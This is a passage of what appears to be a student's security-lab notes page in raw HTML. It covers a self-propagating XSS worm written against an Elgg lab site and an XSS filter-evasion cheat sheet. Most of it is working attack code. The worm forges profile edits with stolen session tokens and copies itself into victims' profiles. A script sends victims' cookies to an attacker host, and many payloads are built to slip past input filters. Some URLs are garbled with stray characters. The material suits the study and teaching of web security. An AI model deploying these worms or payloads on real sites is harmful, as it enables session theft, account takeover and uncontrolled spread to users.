<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">// http://www.xsslabelgg.com/profile/user14/edit</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/profile/</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">// __elgg_ts=AAAA&amp;__elgg_token=BBBB&amp;description=User-11-is-great&amp;name=user14&amp;accesslevel[description]=2&amp;guid=user14Id0000001</span>
<span class="nx">params</span><span class="o">=</span><span class="dl">"</span><span class="s2">__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;description=User-11-is-great</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;accesslevel[description]=2&amp;guid=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">];</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
</pre></table></code></div></div><hr /><h3 id="self-propagation">self-propagation</h3><ul><li>exponential growth<li>dynamically generate code</ul><ol><li><strong>ID/DOM Approach</strong>:<ul><li>If the entire JavaScript program (worm) is embedded in the infected profile<li>the worm code can use <code class="language-plaintext highlighter-rouge">DOM APIs</code> to retrieve a copy of itself from the web page.<li>This code gets a copy of itself, and display it in an alert window:</ul></ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c1">// if f the entire JavaScript program (i.e., the worm) is embedded in the infected profile</span>
<span class="c1">// to propagate the worm to another profile</span>
<span class="c1">// the worm code can use DOM APIs to retrieve a copy of itself from the web page.</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="kd">var</span> <span class="nx">badCode</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">alert</span><span class="p">(</span><span class="nx">badCode</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="c1">// innerHTML only gives us the inside part of the code, var copy = document.getElementById("worm").innerHTML;</span>
    <span class="nx">header</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">worm</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">;</span>
    <span class="nx">tail</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">wormCode</span> <span class="o">=</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">header</span><span class="o">+</span><span class="nx">copy</span><span class="o">+</span><span class="nx">tail</span><span class="p">);</span>
    <span class="nf">alert</span><span class="p">(</span><span class="nx">jsCode</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><ol><li><strong>Src/Link Approach</strong>:<ul><li>If the worm is included using the <code class="language-plaintext highlighter-rouge">src</code> attribute in the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag<li>can simply copy the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag to the victim’s profile, essentially infecting the profile with the same worm.</ul></ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网站//example.com/xss_worm.js</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><ol><li>example</ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="c1">// construct a copy of itself</span>
<span class="kd">var</span> <span class="nx">selfProp</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;script id==</span><span class="se">\"</span><span class="s2">worm</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="dl">"</span>
                <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">)</span>
                <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">// main code ...</span>

<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>


<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">daut</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">sp</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">daut</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementByID</span><span class="p">(</span><span class="dl">"</span><span class="s2">daut</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/action/profile/edit</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

<span class="nx">ff</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/profile/</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">params</span><span class="o">=</span><span class="dl">"</span><span class="s2">__elgg_ts=</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">ts</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;description=User-11-is-great</span><span class="dl">"</span><span class="p">)</span>
<span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nf">escape</span><span class="p">(</span><span class="nx">sp</span><span class="p">)).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;accesslevel[description]=2&amp;guid=</span><span class="dl">"</span><span class="p">)</span>
<span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">]);</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>


</pre></table></code></div></div><hr /><h1 id="xss-filter-evasion-cheat-sheet">XSS Filter Evasion Cheat Sheet</h1><h2 id="use-query">use <code class="language-plaintext highlighter-rouge">query</code></h2><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>http网址www.webpage.org/task/Rule1?query=try
http网址www.webpage.org/task/Rule1?query=&lt;h3&gt;Hello from XSS&lt;/h3&gt;
</pre></table></code></div></div><h2 id="navigates-the-users-browser-to-a-different-url">navigates the user’s browser to a different URL</h2><ul><li>This script navigates the user’s browser to a different URL<li>triggering an HTTP request to the attacker’s server.<li>The URL includes the victim’s cookies as a query parameter<li>the attacker can extract from the request when it arrives to his server.<li>Once the attacker has acquired the cookies, he can impersonate the victim and launch further attacks.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://attacker/?cookie=</span><span class="dl">'</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/NznIJNi.png" alt="persistent-xss" /></p><h2 id="find-different-tag-to-use">find different tag to use</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// tag &lt;script&gt; &lt;body&gt; onclik onAnything been blocked</span>
<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">background:url('javascript:alert(1)')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="strips-out-word-javascript">strips out word <code class="language-plaintext highlighter-rouge">javascript</code></h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">// change line</span>
<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">background:url('java
            script:alert(1)')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="strips-out-word-onreadystatechange">strips out word <code class="language-plaintext highlighter-rouge">onReadyStateChange</code></h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// break the code</span>
<span class="nf">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">xmlhttp.onread</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">yStateChange = callback</span><span class="dl">'</span><span class="p">);</span>
</pre></table></code></div></div><h2 id="basic-xss-test-without-filter-evasion">Basic XSS Test Without Filter Evasion</h2><ul><li>normal XSS JavaScript injection</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">SRC</span><span class="o">=</span><span class="nx">http网址xss</span><span class="p">.</span><span class="nx">rocks</span><span class="o">/</span><span class="nx">xss</span><span class="p">.</span><span class="nx">js</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="xss-locator-polygot">XSS Locator (Polygot)</h2><p>The following is a “polygot test XSS payload.” This test will execute in multiple contexts including html, script string, js and url.</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">javascript</span><span class="p">:</span><span class="cm">/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/</span><span class="p">[]</span><span class="o">/+</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">//'&gt;</span>
</pre></table></code></div></div><hr /><h2 id="image-xss-using-the-javascript-directive">Image XSS Using the JavaScript Directive</h2><p>Image XSS using the JavaScript directive (IE7.0 doesn’t support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="no-quotes-and-no-semicolon">No Quotes and no Semicolon</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="case-insensitive-xss-attack-vector">Case Insensitive XSS Attack Vector</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="nx">JaVaScRiPt</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span><span class="o">&gt;</span>
</pre></table></code></div></div><hr /><h2 id="html-entities">HTML Entities</h2><p>The semicolons are required for this to work:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">XSS</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;)</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="grave-accent-obfuscation">Grave Accent Obfuscation</h2><p>If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don’t know about grave accents:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="s2">`javascript:alert("RSnake says, 'XSS'")`</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="malformed-a-tags">Malformed A Tags</h2><p>Skip the HREF attribute and get to the meat of the XXS</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">\</span><span class="o">&lt;</span> <span class="nx">a</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert(document.cookie)</span><span class="dl">"</span> <span class="err">\</span><span class="o">&gt;</span> <span class="nx">xxs</span> <span class="nx">link</span> <span class="err">\</span><span class="o">&lt;</span> <span class="sr">/a </span><span class="se">\&gt;</span><span class="err">
</span></pre></table></code></div></div><p>or Chrome loves to replace missing quotes</p><ul><li>if you ever get stuck just leave them off<li>Chrome will put them in the right place and fix your missing quotes on a URL or script.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">\</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="err">\</span><span class="o">&gt;</span><span class="nx">xxs</span> <span class="nx">link</span><span class="err">\</span><span class="o">&lt;</span><span class="sr">/a</span><span class="se">\&gt;</span><span class="err">
</span></pre></table></code></div></div><h2 id="malformed-img-tags">Malformed IMG Tags</h2><ul><li>cleaned up and shortened to work in all browsers<li>this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="dl">"""</span><span class="s2">&gt;&lt;SCRIPT&gt;alert(</span><span class="dl">"</span><span class="nx">XSS</span><span class="dl">"</span><span class="s2">)&lt;/SCRIPT&gt;</span><span class="dl">"</span><span class="err">\</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="fromcharcode">fromCharCode</h2><ul><li>If no quotes of any kind are allowed<li>you can <code class="language-plaintext highlighter-rouge">eval() a fromCharCode</code> in JavaScript to create any XSS vector you need:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="nx">javascript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">88</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">83</span><span class="p">))</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="default-src-tag-to-get-past-filters-that-check-src-domain"><code class="language-plaintext highlighter-rouge">Default SRC Tag</code> to Get Past Filters that Check SRC Domain</h2><ul><li>This will bypass most SRC domain filters.<li>Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc.<li>It will also allow any relevant event for the tag type to be substituted like <code class="language-plaintext highlighter-rouge">onblur</code>, <code class="language-plaintext highlighter-rouge">onclick</code> giving you an extensive amount of variations for many injections listed here.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="err">#</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert('xxs')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="default-src-tag-by-leaving-it-empty"><code class="language-plaintext highlighter-rouge">Default SRC Tag</code> by Leaving it Empty</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert('xxs')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="default-src-tag-by-leaving-it-out-entirely">Default SRC Tag by Leaving it out Entirely</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert('xxs')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="on-error-alert">On Error Alert</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="sr">/ onerror="alert</span><span class="se">(</span><span class="sr">String.fromCharCode</span><span class="se">(</span><span class="sr">88,83,83</span><span class="se">))</span><span class="sr">"&gt;&lt;/img</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="img-onerror-and-javascript-alert-encode">IMG onerror and JavaScript Alert Encode</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041</span><span class="dl">"</span><span class="o">&gt;</span>
